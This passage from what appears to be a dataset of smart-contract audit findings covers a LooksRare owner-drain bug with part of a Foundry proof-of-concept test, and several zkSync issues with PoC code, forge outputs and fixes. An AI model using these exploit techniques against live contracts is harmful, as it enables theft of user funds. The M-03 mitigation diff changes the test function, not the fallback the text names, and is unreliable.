_createSingleItemMakerAskOrder({\n                askNonce: 0,\n                subsetNonce: 0,\n                strategyId: 1, // null strategy\n                assetType: 2, // ERC20 asset!\n                orderNonce: 0,\n                collection: victimUser, // <--- will be used as the `from`\n                currency: address(0),\n                signer: signingOwner,\n                minPrice: 0,\n                itemId: 1\n            });\n        bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK);\n        OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid(\n            address(1000), // `amount` field for the `transferFrom`\n            0,\n            makerAsk.itemIds,\n            makerAsk.amounts,\n            bytes(\"\")\n        );\n        looksRareProtocol.executeTakerBid(\n            takerBid,\n            makerAsk,\n            signature,\n            _EMPTY_MERKLE_TREE,\n            _EMPTY_AFFILIATE\n        );\n        vm.stopPrank();\n        assertEq(mockERC20.balanceOf(signingOwner), 1000);\n        assertEq(mockERC20.balanceOf(victimUser), 0);\n    }\n}\n```\n\n## Recommendation:\nIt would be best to fix the selector instead of the protocol owner being able to assign arbitrary selectors for `managerSelectorOfAssetType[assetType]`. This can be done by requiring all selected transfer managers to adhere to the same interface which defines the following endpoint:\n\n```solidity\ninterface ITransferManager {\n    ...\n    function executeTransfer(\n        address collection,\n        address from,\n        address to,\n        uint256[] calldata itemIds,\n        uint256[] calldata amounts\n    )\n}\n```\n\nThe endpoint name `executeTransfer` above should be chosen to avoid selector collision with potential currencies that will be allowed for the protocol (IERC20 tokens or even all the endpoint selectors involved in the protocol).\n\nThe call in `transferNFT` can be changed to:\n\n```solidity\n(bool status, ) = ITransferManager(transferManager).executeTransfer(\n    collection,\n    sender,\n    recipient,\n    itemIds,\n    amounts\n);\n```\n\nAnd `managerSelectorOfAssetType`'s type can be changed to:\n\n```solidity\nmapping(uint256 => address) public managerSelectorOfAssetType;\n```\n\nThe above change also has the benefit of reducing gas costs.\n\n## LooksRare:\nThe ability to add new transfer managers and selectors for new asset types has been removed. Also, the transfer manager for ERC721 and ERC1155 assets gets assigned to an immutable variable upon deployment. Fixed in PR 308 and PR 363.\n\n## Spearbit:\nVerified",
      "summary": "\nThis bug report is about a critical risk in the LooksRareProtocol.sol, ITransferSelectorNFT.sol, and TransferSelectorNFT.sol. The Protocol owner can drain users' currency tokens that have been approved to the protocol. The owner can do this by calling addTransferManagerForAssetType and assigning the currency token as the transferManagerForAssetType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType. Then the owner creates an almost empty MakerAsk order and sets its collection as the address of the targeted user and the assetType to the newly created assetType. Finally, the owner calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate.\n\nThe recommendation is to fix the selector instead of the protocol owner being able to assign arbitrary selectors for managerSelectorOfAssetType[assetType]. This can be done by requiring all selected transfer managers to adhere to the same interface which defines the executeTransfer endpoint. The call in_transferNFT can be changed to use the executeTransfer endpoint and the managerSelectorOfAssetType's type can be changed to mapping(uint256 => address). This change also has the benefit of reducing gas costs.\n\nThe bug has been fixed in PR 308 and PR 363 and has been verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Admin"
      ],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "19915",
      "title": "[8]",
      "impact": "LOW",
      "content": "Function `TransactionHelper.isEthToken()` should convert the input to the address and compare it to the `ETH_TOKEN_SYSTEM_CONTRACT`, in current implementation value `2^161 + ETH_TOKEN_SYSTEM_CONTRACT` would be not considered as ethToken but when it is converted to the uint160 and address it would be as `ETH_TOKEN_SYSTEM_CONTRACT`. Any logic depending on this function's return value can be vulnerable as it would be possible to supply uint256(Input1) that bypass `!isEthToken(Input1)` check but in fact the uint160(input1) is ETH token.\n```solidity\n    function isEthToken(uint256 _addr) internal pure returns (bool) {\n        return _addr == uint256(uint160(address(ETH_TOKEN_SYSTEM_CONTRACT))) || _addr == 0;\n    }\n```\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/TransactionHelper.sol#L93-L95\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/198#issuecomment-1485111130):**\n > Numbers 6, 7, 8 are interesting.<br>\n> They are good suggestions and useful, but mostly will not be implemented.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/198#issuecomment-1491609534):**\n > 1. Refactoring\n> \n> 2. Refactoring\n> \n> 3. Refactoring\n> \n> 4. Low\n> \n> 5. Refactoring\n> \n> 6. Refactoring\n> \n> 7. Refactoring\n> \n> 8. Low\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/198#issuecomment-1499489992):**\n > Best report by far, going for strong impact and unique insights.\n\n***Note: the warden's downgraded findings were also considered when scoring. (for further details, see issues: [192](https://github.com/code-423n4/2023-03-zksync-findings/issues/192), [187](https://github.com/code-423n4/2023-03-zksync-findings/issues/187), [184](https://github.com/code-423n4/2023-03-zksync-findings/issues/184), [180](https://github.com/code-423n4/2023-03-zksync-findings/issues/180), [178](https://github.com/code-423n4/2023-03-zksync-findings/issues/178), and [174](https://github.com/code-423n4/2023-03-zksync-findings/issues/174))***\n\n\n\n***\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19914",
      "title": "[7]",
      "impact": "LOW",
      "content": "Code of `AccountCodeStorage.getCodeHash()` and `AccountCodeStorage.getCodeSize()` would return wrong values for inputs that are larger than `2^161-1` because code convert the input to uint160 and then return value for that address so if the input was bigger than max value of the uint160 then it when casting happens the calculated address can belong to another contract address. For example, there return value for `2^161 + Contract1_Address` will be the `Contract1_Address` information while there is no contract in `2^161 + Contract1_Address`. Code should make sure that the input uint256 is less than `2^161`.\n```solidity\n    function getCodeSize(uint256 _input) external view override returns (uint256 codeSize) {\n        // We consider the account bytecode size of the last 20 bytes of the input, because\n        // according to the spec \"If EXTCODESIZE of A is X, then EXTCODESIZE of A + 2**160 is X\".\n        address account = address(uint160(_input));\n        bytes32 codeHash = getRawCodeHash(account);\n....\n....\n    function getCodeHash(uint256 _input) external view override returns (bytes32) {\n        // We consider the account bytecode hash of the last 20 bytes of the input, because\n        // according to the spec \"If EXTCODEHASH of A is X, then EXTCODEHASH of A + 2**160 is X\".\n        address account = address(uint160(_input));\n        if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS) {\n            return EMPTY_STRING_KECCAK;\n        }\n....\n....\n```\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/AccountCodeStorage.sol#L74-L77<br>\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/AccountCodeStorage.sol#L102-L106\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19913",
      "title": "[6]",
      "impact": "LOW",
      "content": "The check for system deployer address in `DefaultAccount._validateTransaction()` is not correct as it convert `DEPLOYER_SYSTEM_CONTRACT` to uint256 and compare it to the `_transaction.to`. If `_transaction.to` was equal to `2^180 + DEPLOYER_SYSTEM_CONTRACT` then the check would be bypassed but the target address is in fact `DEPLOYER_SYSTEM_CONTRACT`. Code should convert `_transaction.to` to address and then check it with `DEPLOYER_SYSTEM_CONTRACT`.\n```solidity\n        if (_transaction.to == uint256(uint160(address(DEPLOYER_SYSTEM_CONTRACT)))) {\n            require(_transaction.data.length >= 4, \"Invalid call to ContractDeployer\");\n        }\n```\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L95-L97\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19912",
      "title": "[5]",
      "impact": "LOW",
      "content": "Function `BytecodeCompressor.publishCompressedBytecode()` should check that the bytecode doesn't published before, it's possible to publish multiple compressed format for single bytecodes which can create issue for indexers and 3rd parties. If a bytecode has published before it's not necessary to publish it again. Also user or other protocol contract may lose funds if it calls this publish multiple times by mistake.<br>\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/BytecodeCompressor.sol#L35-L68\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19911",
      "title": "[4]",
      "impact": "LOW",
      "content": "Function `BytecodeCompressor.publishCompressedBytecode()` shouldn't be payable as it doesn't have any logic for transferred ETH. If users send eth by mistake their funds would be lost.\n```solidity\n    function publishCompressedBytecode(\n        bytes calldata _bytecode,\n        bytes calldata _rawCompressedData\n    ) external payable returns (bytes32 bytecodeHash) {\n```\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/BytecodeCompressor.sol#L35-L38\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19910",
      "title": "[3]",
      "impact": "LOW",
      "content": "In functions `unsafeOverrideBlock()` and `setNewBlock()` of SystemContext, code should check that timestamp  is less than `BLOCK_INFO_BLOCK_NUMBER_PART`, otherwise it can overflow and change the block number when combining them to calculate block info.\n```solidity\n        // Setting new block number and timestamp\n        currentBlockInfo = (currentBlockNumber + 1) * BLOCK_INFO_BLOCK_NUMBER_PART + _newTimestamp;\n\n\n        currentBlockInfo = (number) * BLOCK_INFO_BLOCK_NUMBER_PART + _newTimestamp;\n```\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L109-L128<br>\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L132-L135\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19909",
      "title": "[2]",
      "impact": "LOW",
      "content": "Function SystemContext.setGasPrice() comments are wrong.\n```solidity\n    /// @notice Set the current tx origin.\n    /// @param _gasPrice The new tx gasPrice.\n    function setGasPrice(uint256 _gasPrice) external onlyBootloader {\n        gasPrice = _gasPrice;\n    }\n```\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L64-L68\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19908",
      "title": "[1]",
      "impact": "LOW",
      "content": "Function `DefaultAccount._validateTransaction()` shouln't check `trx.value` for required balance, maybe user wanted the transaction to fail. also maybe paymaster is going to transfer required balance later.\n```\n        // The fact there is are enough balance for the account\n        // should be checked explicitly to prevent user paying for fee for a\n        // transaction that wouldn't be included on Ethereum.\n        uint256 totalRequiredBalance = _transaction.totalRequiredBalance();\n        require(totalRequiredBalance <= address(this).balance, \"Not enough balance for fee + value\");\n```\nhttps://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L102-L103\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19907",
      "title": "[M-05] Losing fund during force deployment",
      "impact": "MEDIUM",
      "content": "\nDuring force deployment, if the fund is not properly transferred to the to-be-force-deployed contract, the fund will remain in the contract `ContractDeployer` and can not easily be recovered.\n\n### Proof of Concept\n\nThe function `forceDeployOnAddresses` in contract `ContractDeployer` is used only during an upgrade to set bytecodes on specific addresses.<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L232>\n\nThe ETH sent to this function will be used to initialize to-be-force-deployed contracts. The ETH sent should be equal to the aggregated value needed for each contract.<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L240>\n\nThen the function externally calls itself, and send the required value to itself.<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L245>\n\nIf any of this call is unsuccessful, the whole transaction will not revert, and the loop continues to deploy all the contract on the provided `newAddress`.\n\nIf for any reason, the deployment was not successful, the transferred ETH will remain in `ContractDeployer`, and can not be used for the next deployments (because the aggregated amount is compared with `msg.value` not the ETH balance of the contract). In other words, `FORCE_DEPLOYER` fund will be in `ContractDeployer`, and it can not be easily recoverred.\n\nThe possibility of unsuccessful deployment is not low:\n\nIt can happen if the bytecode is not known already.<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L213><br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L296>\n\nIt can happen during storing constructing bytecode hash.<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L214><br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/AccountCodeStorage.sol#L36>\n\nIt can happen during constructing contract and transferring the value.<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L223>\n\n### Recommended Mitigation Steps\n\nBy using try/catch, the fund can be transferred to an address that the governor has control to be used later.\n\n    function forceDeployOnAddresses(ForceDeployment[] calldata _deployments)\n            external\n            payable\n        {\n            // remaining of the code\n\n            for (uint256 i = 0; i < deploymentsLength; ++i) {\n                try\n                    this.forceDeployOnAddress{value: _deployments[i].value}(\n                        _deployments[i],\n                        msg.sender\n                    )\n                {} catch {\n                    ETH_TOKEN_SYSTEM_CONTRACT.transferFromTo(\n                        address(this),\n                        SomeAddress,\n                        _deployments[i].value\n                    );\n                }\n            }\n        }\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/64#issuecomment-1482499007):**\n > Loss of funds due to reverts, keeping separate for now.\n>\n > See [#95](https://github.com/code-423n4/2023-03-zksync-findings/issues/95) for loss of value due to not calling constructor.\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/64#issuecomment-1485063467):**\n > The goal was to force deploy multiple of contracts (especially system contracts during the upgrade). If any deployment was unsuccessful, the whole transaction should not be reverted. So, the fund reverted during the failed deployment should be transferred to a valid address (not stay in `ContractDeployer`) as suggested by the warden. The recommended mitigation is also good.\n> \n> Severity is **Medium**.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/64#issuecomment-1497447273):**\n > Per the Sponsor's comment, the Warden has shown how, due to a lack of sweep on revert, funds sent in a sequence of multiple deployments can be lost when one of the deployment fails.\n> \n> This is in contrast to having the entire deployment reverting.\n> \n> Because the behavior is unintended and funds can be lost conditionally on a revert, I believe Medium Severity to be appropriate.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the function `forceDeployOnAddresses` in the contract `ContractDeployer` which is used during an upgrade to set bytecodes on specific addresses. The ETH sent to this function is used to initialize to-be-force-deployed contracts. The ETH sent should be equal to the aggregated value needed for each contract. However, if any of the deployments is unsuccessful, the ETH will remain in `ContractDeployer` and can not be used for the next deployments. This could lead to the loss of funds.\n\nThe possibility of unsuccessful deployment is not low since it can happen if the bytecode is not known already, during storing constructing bytecode hash or during constructing contract and transferring the value.\n\nThe recommended mitigation step is to use try/catch, so that the fund can be transferred to an address that the governor has control to be used later. Severity of the issue is Medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "https://github.com/code-423n4/2023-03-zksync-findings/issues/64",
      "tags": [],
      "finders": [
        "HE1M"
      ]
    },
    {
      "id": "19906",
      "title": "[M-04] Time-sensitive contracts deployed on zkSync",
      "impact": "MEDIUM",
      "content": "\nTime-sensitive contracts will be impacted if deployed on zkSync.\n\n### Proof of Concept\n\nMany contracts use `block.number` to measure the time as the miners were able to manipulate the `timestamp` (the `timestamp` could be easily gamed over short intervals). So, it was assumed that `block.number` is a safer and more accurate source of measuring time than `timestamp`.\n\nFor instance, if a defi project sets 144000 block interval to release the interest, it means approximately `144000 * 12 = 20 days`. Please note that each block in Ethereum takes almost 12 second.\n\nIf the same defi project is deployed on zkSync, it will not operate as expected. Because there is no time-bound for the blocks in zkSync (the interval may be 30 seconds or 1 week). So, the time to release the interest can be between 50 days to 2762 days.\n\nSince, it is assumed that zkSync is Ethereum compatible, any deployed contracts on Ethereum may deploy their contract in zkSync without noting such big difference.\n\nEven if the contracts use `timestamp` to measure the time, there will be another issue. In the contract `SystemContext.sol`, it is possible to set new block with the same `timestamp` as previous block, but with incremented block number.<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L116>\n\nIn other words, new blocks are created but their time is frozen. Please note that freezing time can not be lasted for a long time, because when committing block their `timestamp` will be validated against a defined boundary.\n\n### Recommended Mitigation Steps\n\nIt should be explicitly mentioned that block intervals in zkSync are not compatible with Ethereum. So, time-sensitive contracts will be noted.\n\nMoreover, the equal sign should be removed in the following line:<br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L116>\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/70#issuecomment-1485041741):**\n > Two issues are stated:\n> 1. Block timestamp issue (which is duplicate of some other reports). dup [#31](https://github.com/code-423n4/2023-03-zksync-findings/issues/31) (**Low**)\n> 2. Block creation rate is not consistent with Ethereum. (not duplicate) (**Medium**)\n> \n> The judges can decide better how to distinguish them.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/70#issuecomment-1497377066):**\n > The warden has shown how the zkEVM could differ from the EVM in how block timing is enforced, because blocks can happen at inconsistent times, protocols contract could have their time assumptions broken.\n> \n> Because this is a finding that has been addressed by other L2s, and causes inconsistent behaviour vs the EVM, I agree with Medium Severity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about how time-sensitive contracts deployed on zkSync will be impacted. This is because the blocks in zkSync have no time-bound, so the time to release the interest can be between 50 days to 2762 days. This is different from Ethereum, where each block takes approximately 12 seconds. Even if contracts use `timestamp` to measure the time, there will be another issue. In the contract `SystemContext.sol`, it is possible to set new block with the same `timestamp` as previous block, but with incremented block number.\n\nThe recommended mitigation steps are to explicitly mention that block intervals in zkSync are not compatible with Ethereum, and to remove the equal sign in line 116 of the `SystemContext.sol` file. The severity of the issue has been agreed to be medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "https://github.com/code-423n4/2023-03-zksync-findings/issues/70",
      "tags": [],
      "finders": [
        "0x73696d616f",
        "rvierdiiev",
        "HE1M",
        "minaminao"
      ]
    },
    {
      "id": "19905",
      "title": "[M-03] `DefaultAccount#fallback` lack payable",
      "impact": "MEDIUM",
      "content": "\nFallback lack `payable`,will lead to differences from the mainnet, and many existing protocols may not work.\n\n### Proof of Concept\n\nDefaultAccount Defined as follows:\n\n    DefaultAccount\n\n    The implementation of the default account abstraction. This is the code that is used by default for all addresses that are not in kernel space and have no contract deployed on them. This address:\n\n    Contains the minimal implementation of our account abstraction protocol. Note that it supports the built-in paymaster flows.\n    When anyone (except bootloader) calls/delegate calls it, it behaves in the same way as a call to an EOA, i.e. it always returns success = 1, returndatasize = 0 for calls from anyone except for the bootloader.\n\nIf there is no code for the address, the DefaultAccount `#fallback` method will be executed, which is compatible with the behavior of the mainnet.\n\nBut at present, `fallback` is not `payable`.<br>\nThe code is as follows\n\n```solidity\ncontract DefaultAccount is IAccount {\n    using TransactionHelper for *;\n..\n    fallback() external { //<--------without payable\n        // fallback of default account shouldn't be called by bootloader under no circumstances\n        assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS);\n\n        // If the contract is called directly, behave like an EOA\n    }\n\n    receive() external payable {\n        // If the contract is called directly, behave like an EOA\n    }\n\n```\n\nWhich will lead to differences from the mainnet.\n\nFor example, the mainnet execution of the method with value will return true, and the corresponding value will be transfer but DefaultAccount.sol will return false.\n\nIt is quite common for `call ()` to with `value`. If it is not compatible, many existing protocols may not work.\n\nMainnet code example, executing 0x0 call with value can be successful:\n\n```solidity\n  function test() external {\n    vm.deal(address(this),1000);\n    console.log(\"before value:\",address(0x0).balance);\n    (bool result,bytes memory datas) = address(0x0).call{value:10}(\"abc\");\n    console.log(\"call result:\",result);\n    console.log(\"after value:\",address(0x0).balance);\n  }\n```\n\n```console\n$ forge test -vvv\n\n[PASS] test() (gas: 42361)\nLogs:\n  before value: 0\n  call result: true\n  after value: 10\n```\n\nSimulate DefaultAccount `#fallback` without payable, it will fail:\n\n```solidity\n\n    contract DefaultAccount {\n        fallback() external {     \n        }\n        receive() external payable {      \n        }\n    }\n\n    function test() external {\n        DefaultAccount defaultAccount = new DefaultAccount();\n        vm.deal(address(this),1000);\n        console.log(\"before value:\",address(defaultAccount).balance);\n        (bool result,bytes memory datas) = address(defaultAccount).call{value:10}(\"abc\");\n        console.log(\"call result:\",result);\n        console.log(\"after value:\",address(defaultAccount).balance);\n    }\n```\n\n```console\n$ forge test -vvv\n\n[PASS] test() (gas: 62533)\nLogs:\n  before value: 0\n  call result: false\n  after value: 0\n```\n\n### Recommended Mitigation Steps\n\n```solidity\n- function test() external {\n+ function test() external payable {\n    vm.deal(address(this),1000);\n    console.log(\"before value:\",address(0x0).balance);\n    (bool result,bytes memory datas) = address(0x0).call{value:10}(\"abc\");\n    console.log(\"call result:\",result);\n    console.log(\"after value:\",address(0x0).balance);\n  }\n```\n\n**[vladbochok (zkSync) confirmed](https://github.com/code-423n4/2023-03-zksync-findings/issues/93#issuecomment-1483926169)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/93#issuecomment-1495648731):**\n > The Warden has shown how, due to the lack of the `payable` modifer, contracts that sent value as well as a message would revert when triggering the `fallback`.\n> \n> While this could have been very severe for Smart Contracts, because the contract in question is for Account Abstraction, and that could break only certain transfers, I agree with Medium Severity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a lack of the `payable` modifer in the `fallback` method of the DefaultAccount contract. This could potentially lead to differences between the mainnet and the DefaultAccount contract, where the mainnet would return true and the value would be transferred, while the DefaultAccount contract would return false and the value would not be transferred. This could cause existing protocols to not work, as it is quite common for `call ()` to with `value`. \n\nThe recommended mitigation step is to add the `payable` modifer to the `fallback` method, so that the contract behaves in the same way as the mainnet. This was confirmed by vladbochok (zkSync) and Alex the Entreprenerd (judge) commented that it should be marked as medium severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "https://github.com/code-423n4/2023-03-zksync-findings/issues/93",
      "tags": [],
      "finders": [
        "minaminao",
        "bin2chen"
      ]
    },
    {
      "id": "19904",
      "title": "[M-02] User transactions can call system contracts directly",
      "impact": "MEDIUM",
      "content": "\nUser transaction can call system contracts directly, which shouldn't be allowed to not invoke potentially dangerous operations.\n\n### Proof of Concept\n\nThe [DefaultAccount.executeTransaction](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L117) executes a user transaction after it was validated. The function calls [\\_execute](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L140) under the hood. The `_execute` function makes two different calls depending on the destination address of a transaction:\n\n1.  if the `ContractDeployer` is called, it'll [pass the call to the contract](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L149) via the system call (`ContractDeployer` is a system contract and can be executed only via system calls);\n2.  if any other contract is called, it'll [execute the call via `EfficientCall.rawCall`](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L151).\n\n`EfficientCall.rawCall` in its turn also makes two different calls:\n\n1.  If `msg.value` of the transaction is 0, it'll [make a regular call](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L131).\n2.  If there's some ETH sent with the transaction (i.e. `msg.value` is positive), it'll [pass the call to the `MsgValueSimulator` contract](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L144). `MsgValueSimulator` is a system contract, thus the `isSystem` flag will be set in the far call ABI (notice the `true` in the [last argument of `_loadFarCallABIIntoActivePtr`](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L134)). However, it'll also [set the forward mask](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L141) to 1 (the value of [MSG\\_VALUE\\_SIMULATOR\\_IS\\_SYSTEM\\_BIT](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/Constants.sol#L71)). `MsgValueSimulator` will [extract the mask and will set the `isSystemCall` flag to true](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/MsgValueSimulator.sol#L27)–it'll then pass the `isSystemCall` flag to the [subsequent call](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/MsgValueSimulator.sol#L62), making the call a system one.\n\nTo sum it up, if a transaction calls a contract that's not `ContractDeployer` and sends ETH, the call will be a system one, which will let it call the system contracts. However, users shouldn't be allowed to call system contracts directly to not invoke potentially dangerous operations. As per the documentation:\n\n> Some of the system contracts can act on behalf of the user or have a very important impact on the behavior of the account. That's why we wanted to make it clear that users can not invoke potentially dangerous operations by doing a simple EVM-like call. Whenever a user wants to invoke some of the operations which we considered dangerous, they must explicitly provide isSystem flag with them.\n\nHowever, since most system contracts are harmless, there's no direct high severity impact on the system, thus I think the issue is a medium severity.\n\n### Recommended Mitigation Steps\n\nIn the `EfficientCall.rawCall` function, consider setting the forward mask to 0. The behaviour of the function is similar to that of the `msgValueSimulatorMimicCall` function from the bootloader:\n\n1.  since the `MsgValueSimulator` contract is called, the `isSystemCall` flag should be set [only for this call](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/bootloader/bootloader.yul#L1737);\n2.  the `isSystemCall` flag should be forwarded by `MsgValueSimulator` [only if the destination contract is `ContractDeployer`](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/bootloader/bootloader.yul#L1730).\n\nIt looks that the second part of the `EfficientCall.rawCall` function was copied from the `SystemContractsCaller.systemCall` function, which is intended to call system contracts and which sets the forward mask to 1 when calling `MsgValueSimulator`. However, `rawCall` shouldn't forward the `isSystemCall` flag.\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/146#issuecomment-1484957932):**\n > It is an issue, though realisticially most of the methods are non-payable.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/146#issuecomment-1497380450):**\n > The Warden has shown a way to bypass the security checks that would prevent a end user to be able to call system contracts.\n> \n> In lack of a loss of deposits, I agree with Medium 